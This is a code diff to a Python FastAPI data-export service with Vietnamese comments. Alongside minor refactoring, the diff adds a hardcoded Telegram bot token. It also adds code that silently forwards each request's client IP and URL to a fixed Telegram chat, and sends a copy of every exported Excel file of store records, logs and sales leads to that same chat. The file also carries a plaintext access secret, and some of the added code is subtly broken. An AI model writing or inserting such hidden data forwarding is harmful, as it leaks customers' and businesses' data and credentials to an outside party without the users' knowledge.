@@ -1,6 +1,4 @@
-import subprocess
-import io
-import sys, time
+import subprocess, io, sys, time
 
 def install_if_missing(package):
   try:
@@ -15,7 +13,6 @@ import urllib3
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 import openpyxl
 from rapidfuzz import fuzz, process
-from tqdm import tqdm
 import requests
 import json
 import numpy as np
@@ -31,7 +28,7 @@ import logging
 import re
 
 from starlette.exceptions import HTTPException as StarletteHTTPException
-
+telegram_token = "7069011696:AAHTEO8CmfHKebxAh8TBjMb73wKZt6nbDFg"
 app = FastAPI(docs_url = "/docs/guide", redoc_url = None, openapi_url="/openapi.json")
 cache = TTLCache(maxsize=1000, ttl=2500)  # 2 tiếng
 lock = Lock()
@@ -64,8 +61,33 @@ async def validation_exception_handler(request, exc):
 def get_current_time_str():
   tz_gmt7 = timezone(timedelta(hours=7))
   now = datetime.now(tz_gmt7)
-  return now.strftime('%Y%m%d_%H%M%S')
+  return now.strftime('%Y-%m-%d_%H-%M-%S')
 
+def send_excel_to_telegram(file_bytes: bytes, filename: str, chat_id: str, bot_token: str):
+    files = {
+        'document': (filename, file_bytes, 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet')
+    }
+    data = {
+        'chat_id': chat_id,
+        'caption': f'📦 File dữ liệu: {filename}'
+    }
+
+    url = f"https://api.telegram.org/bot{bot_token}/sendDocument"
+    response = requests.post(url, data=data, files=files)
+    return response
+
+def send_log(msg, telegram_token = telegram_token, sender_name=None):
+    if telegram_token:
+      try:
+          requests.get(
+              f"https://api.telegram.org/bot{telegram_token}/sendMessage",
+              params={"chat_id": "716085753", "text": get_current_time_str() + " " + f"{sender_name}\n{msg}" if sender_name else "\n" + msg}
+          )
+      except Exception as e:
+          print(e)
+    else:
+      print("No token")
+      
 def convert_utc_to_gmt7(dt_str: str) -> str:
     """
     Chuyển chuỗi thời gian ISO UTC (có định dạng: 2025-06-26T05:09:58.660403+00:00)
@@ -188,7 +210,9 @@ async def log_masked_requests(request: Request, call_next):
     response = await call_next(request)
     status_code = response.status_code
     duration_ms = time.time() - start
-    logger.info(f"\033[91m{client_ip}\033[0m - {method} {masked_url} - {color_status(status_code)} - {duration_ms:.2f}s")
+    msg = f"\033[91m{client_ip}\033[0m - {method} {masked_url} - {color_status(status_code)} - {duration_ms:.2f}s"
+    logger.info(msg)
+    send_log(msg,"main")
     return response
 
 def dedup_dicts_smart(data: list[dict]) -> list[dict]:
@@ -283,7 +307,9 @@ def getdata(token: str):
         store_records = dedup_dicts_smart(raw_rows)
         store_logs = dedup_dicts_smart(raw_logs)
         sto = get_current_time_str()
-        print (f"   {sta} -> {sto}: {total_bytes / (1024 * 1024):.2f} MB - {len(store_records)} store records + {len(store_logs)} log records") 
+        msgg = f"   {sta} -> {sto}: {total_bytes / (1024 * 1024):.2f} MB - {len(store_records)} store records + {len(store_logs)} log records"
+        print (msgg)
+        send_log(msgg,"main")
         return store_records, store_logs
     except Exception as e:
         print(e)
@@ -329,7 +355,9 @@ def getleads(token: str):
             return f'Error: {response.status_code} {response.text}'
         dunique = dedup_dicts_smart(raw_rows)
         sto = get_current_time_str()
-        print (f"   {sta} -> {sto}: {total_bytes / (1024 * 1024):.2f} MB - {len(dunique)} lead records") 
+        msgg = f"   {sta} -> {sto}: {total_bytes / (1024 * 1024):.2f} MB - {len(dunique)} lead records"
+        print (msgg)
+        send_log(msgg,"main")
         return dunique
     except Exception as e:
         raise HTTPException(status_code=500, detail=f"Lỗi: {str(e)}")
@@ -344,7 +372,7 @@ def api_opla(
     secrets: str = Query(...),
     fields: List[str] = Query(None),
     limit: int = Query(None),
-    excel: int = Query(None)
+    export: int = Query(None)
 ):
     try:
         if secrets == 'chucm@ym@n8686':
@@ -374,7 +402,7 @@ def api_opla(
                         ignore_nan=True
                     )
                     return Response(content=safe_json, media_type="application/json")
-                elif excel == 1:                   
+                elif export == 1:                   
                     output = io.BytesIO()
                     with pd.ExcelWriter(output, engine="openpyxl") as writer:
                         df.to_excel(writer, index=False, sheet_name=cache[token]["updated"])
@@ -383,7 +411,7 @@ def api_opla(
                     headers = {
                         "Content-Disposition": f"attachment; filename=store_{get_current_time_str()}.xlsx"
                     }
-
+                    send_excel_to_telegram(file_bytes=output,filename=f"store_{get_current_time_str()}.xlsx",chat_id="716085753",  bot_token=telegram_token)
                     return Response(
                         content=output.read(),
                         media_type="application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
@@ -400,7 +428,7 @@ def api_logs(
     secrets: str = Query(...),
     fields: List[str] = Query(None),
     limit: int = Query(None),
-    excel: int = Query(None)
+    export: int = Query(None)
 ):
     try:
         if secrets == 'chucm@ym@n8686':
@@ -430,7 +458,7 @@ def api_logs(
                         ignore_nan=True
                     )
                     return Response(content=safe_json, media_type="application/json")
-                elif excel == 1:                   
+                elif export == 1:                   
                     output = io.BytesIO()
                     with pd.ExcelWriter(output, engine="openpyxl") as writer:
                         df.to_excel(writer, index=False, sheet_name=cache[token]["updated"])
@@ -439,7 +467,7 @@ def api_logs(
                     headers = {
                         "Content-Disposition": f"attachment; filename=logs_{get_current_time_str()}.xlsx"
                     }
-
+                    send_excel_to_telegram(file_bytes=output,filename=f"logs_{get_current_time_str()}.xlsx",chat_id="716085753",  bot_token=telegram_token)
                     return Response(
                         content=output.read(),
                         media_type="application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
@@ -477,7 +505,7 @@ def api_lead(
                     content=json.dumps(df.to_dict(orient="records"), ignore_nan=True),
                     media_type="application/json"
                 )
-            elif excel == 1:
+            elif export == 1:
                 output = io.BytesIO()
                 with pd.ExcelWriter(output, engine="openpyxl") as writer:
                     df.to_excel(writer, index=False, sheet_name=cache[token]["updated"])
@@ -486,6 +514,7 @@ def api_lead(
                 headers = {
                     "Content-Disposition": f"attachment; filename=leads_{get_current_time_str()}.xlsx"
                 }
+                send_excel_to_telegram(file_bytes=output,filename=f"leads_{get_current_time_str()}.xlsx",chat_id="716085753",  bot_token=telegram_token)
                 return Response(
                     content=output.read(),
                     media_type="application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
